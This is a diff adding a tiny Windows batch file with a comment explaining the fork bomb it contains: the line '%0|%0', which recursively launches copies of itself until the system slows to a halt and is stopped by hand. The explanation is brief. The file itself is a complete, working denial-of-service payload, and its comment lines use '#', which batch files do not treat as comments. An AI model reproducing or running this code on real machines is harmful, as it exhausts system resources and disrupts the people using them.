@@ -1,0 +1,3 @@
+# A batch file contains instructions to be executed in sequence. In this batch file, %0 is # the name of the currently executing code. This batch file is going to repeatedly execute # itself forever. It quickly creates many processes and slows down the system. First the %0 # command is run and then the second %0 command, which is located after the pipe, is run. # They both run repeatedly until manually stopped.
+
+%0|%0
